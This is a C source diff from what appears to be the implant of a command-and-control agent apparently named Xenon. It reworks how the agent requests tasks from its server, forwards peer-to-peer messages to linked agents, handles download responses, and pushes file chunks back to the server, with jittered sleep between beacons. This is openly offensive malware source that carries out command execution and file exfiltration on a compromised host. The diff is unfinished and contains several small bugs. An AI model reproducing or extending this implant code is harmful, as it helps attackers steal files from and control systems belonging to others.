@@ -102,37 +102,38 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
         case DOWNLOAD_CMD:
         {
             _dbg("DOWNLOAD_CMD was called");
-            
+            Download(taskUuid, taskParser);
+
             // Freed inside of thread function
-            TASK_PARAMETER* tp = (TASK_PARAMETER*)LocalAlloc(LPTR, sizeof(TASK_PARAMETER));
-            if (!tp)
-            {
-                _err("Failed to allocate memory for task parameter.");
-                return;
-            }
+            // TASK_PARAMETER* tp = (TASK_PARAMETER*)LocalAlloc(LPTR, sizeof(TASK_PARAMETER));
+            // if (!tp)
+            // {
+            //     _err("Failed to allocate memory for task parameter.");
+            //     return;
+            // }
 
-            tp->TaskParser = (PPARSER)LocalAlloc(LPTR, sizeof(PARSER));
-            if (!tp->TaskParser) {
-                _err("Failed to allocate memory for TaskParser.");
-                free(tp->TaskUuid);
-                LocalFree(tp);
-                return;
-            }
+            // tp->TaskParser = (PPARSER)LocalAlloc(LPTR, sizeof(PARSER));
+            // if (!tp->TaskParser) {
+            //     _err("Failed to allocate memory for TaskParser.");
+            //     free(tp->TaskUuid);
+            //     LocalFree(tp);
+            //     return;
+            // }
 
-            // Duplicate so we don't use values that are freed before the thread finishes
-            tp->TaskUuid = _strdup(taskUuid);
-            ParserNew(tp->TaskParser, taskParser->Buffer, taskParser->Length);
+            // // Duplicate so we don't use values that are freed before the thread finishes
+            // tp->TaskUuid = _strdup(taskUuid);
+            // ParserNew(tp->TaskParser, taskParser->Buffer, taskParser->Length);
 
-            // Threaded so it doesn't block main thread (usually needs alot of requests).
-            HANDLE hThread = CreateThread(NULL, 0, DownloadThread, (LPVOID)tp, 0, NULL);
-            if (!hThread) {
-                _err("Failed to create download thread");
-                free(tp->TaskUuid);
-                ParserDestroy(tp->TaskParser);
-                LocalFree(tp);
-            } else {
-                CloseHandle(hThread); // Let the thread run independently
-            }
+            // // Threaded so it doesn't block main thread (usually needs alot of requests).
+            // HANDLE hThread = CreateThread(NULL, 0, DownloadThread, (LPVOID)tp, 0, NULL);
+            // if (!hThread) {
+            //     _err("Failed to create download thread");
+            //     free(tp->TaskUuid);
+            //     ParserDestroy(tp->TaskParser);
+            //     LocalFree(tp);
+            // } else {
+            //     CloseHandle(hThread); // Let the thread run independently
+            // }
             
             return;
         }
@@ -358,11 +359,91 @@ VOID TaskProcess(PPARSER tasks)
     }
 }
 
+/** 
+ * @brief Process the responses from Tasks
+ * 
+ * This is for tasks that require back n forth
+ * e.g., download, upload, p2p
+ */
+VOID TaskProcessResponses(PPARSER Response)
+{
+    /* 
+        TODO 
+        - Handle multiple responses here
+        {
+            "action":"post_response",
+            "responses":[
+                {
+                    "file_id":"",
+                    "status":"success",
+                    "task_id":""
+                },
+                {
+                    more
+                }
+            ]
+        }
+    */
+
+    SIZE_T fidLen       = TASK_UUID_SIZE;
+    SIZE_T tidLen       = TASK_UUID_SIZE;
+    PCHAR  FileUuid     = NULL;
+    PCHAR  TaskUuid     = NULL;
+    BYTE   Type         = NULL;
+    BYTE   Status       = NULL;
+
+    Status              = ParserGetByte(Response);
+    Status              = ParserGetByte(Response);
+    Type                = ParserGetByte(Response);
+    TaskUuid            = ParserStringCopy(Response, &tidLen);
+
+    _dbg("TaskUuid: %d bytes length - %s", tidLen, TaskUuid);
+
+    if ( Type == DOWNLOAD_RESP )
+    {
+        FileUuid = ParserStringCopy(Response, &fidLen);
+
+        if ( !DownloadUpdateFileUuid(TaskUuid, FileUuid) ) {
+            _err("Failed to update download file ID.");
+        }
+    }
+
+    /* Upload etc */
+
+
+    /* Clean Up */
+    if (FileUuid) LocalFree(FileUuid);
+    if (TaskUuid) LocalFree(TaskUuid);
+}
+
 VOID TaskRoutine()
 {
+/*
+    What if I refactor the task handler to loop through different 
+    "packages" and make delegates a package task. DELEGATE_FORWARD
+*/
+
+    PARSER Test = { 0 };
+    if ( PackageSendAll(&Test) )
+    {
+        if ( Test.Buffer != NULL )
+        {
+            _dbg("Response from PackageSendALL");
+            print_bytes(Test.Buffer, Test.Length);
+
+            TaskProcessResponses(&Test);
+        }
+    }
+    
+
+    if (&Test != NULL) ParserDestroy(&Test);
+
+
     /* Ask server for new tasks */
     PARSER   tasks   = { 0 };
-    PPackage req     = PackageInit(GET_TASKING, TRUE);
+    PPackage req     = NULL;
+    
+    req = PackageInit(GET_TASKING, TRUE);
     
     PackageAddInt32(req, NUMBER_OF_TASKS);
 
@@ -370,6 +451,13 @@ VOID TaskRoutine()
     
     if (bStatus == FALSE || tasks.Buffer == NULL)
         goto CLEANUP;
+
+    /**
+     * TODO - Fix this as it breaks things that use PackageSend and process a response
+     * Such as:
+     *  Download
+     *  Upload
+     */
 
 
     /* Check response for Delegate msgs */
@@ -387,22 +475,19 @@ VOID TaskRoutine()
     {
         NumOfDelegates  = ParserGetInt32(&tasks);
         P2pUuid         = ParserGetString(&tasks, &P2pIdLen);
-        P2pMsg          = ParserStringCopy(&tasks, &P2pMsgLen);
+        P2pMsg          = ParserGetString(&tasks, &P2pMsgLen);
 
         _dbg("Package should contain : %d msgs.", NumOfDelegates);
         _dbg("P2P New UUID           : %s", P2pUuid);
         _dbg("P2P Raw Msg %d bytes   : %s", P2pMsgLen, P2pMsg);
         /* Forward msg to intended Linked Agent */
         LinkForward( P2pMsg, P2pMsgLen );
-
-        // TODO Don't allocate for this
-        if (P2pMsg) LocalFree(P2pMsg);
     }
 
 #endif
 
 
-    /* Process all tasks */ 
+    /* Process all tasks */
     TaskProcess(&tasks);
 
 
@@ -413,11 +498,18 @@ VOID TaskRoutine()
     
 #endif
 
+    /* Push File Chunks to Server */
+#if defined(INCLUDE_CMD_DOWNLOAD)
+
+    DownloadPush();
+
+#endif
+
 
 CLEANUP:
     // Cleanup
-    PackageDestroy(req);
-    ParserDestroy(&tasks);
+    if (req != NULL) PackageDestroy(req);
+    if (&tasks != NULL) ParserDestroy(&tasks);
 
     // zzzz
     SleepWithJitter(xenonConfig->sleeptime, xenonConfig->jitter);
